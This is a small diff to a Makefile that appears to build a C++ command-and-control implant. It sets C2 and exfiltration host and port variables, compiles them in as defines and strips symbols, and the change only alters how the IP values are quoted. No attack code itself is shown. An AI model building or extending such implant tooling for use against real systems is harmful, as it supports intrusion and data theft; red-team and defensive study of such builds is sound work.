@@ -8,7 +8,7 @@ EXFIL_PORT ?= 8889
 
 # Compiler and flags for c++
 CXX = g++
-CXXFLAGS = -g -s -DC2_IP='"$(C2_IP)"' -DC2_PORT='$(C2_PORT)' -DEXFIL_IP='"$(EXFIL_IP)"' -DEXFIL_PORT='$(EXFIL_PORT)' 
+CXXFLAGS = -g -s -DC2_IP='$(C2_IP)' -DC2_PORT='$(C2_PORT)' -DEXFIL_IP='$(EXFIL_IP)' -DEXFIL_PORT='$(EXFIL_PORT)' 
 LDFLAGS = -Wl,-Bstatic -lssl -lcrypto -Wl,-Bdynamic -ldl -lpthread
 TARGET = implant
 SRC = implant.cpp 
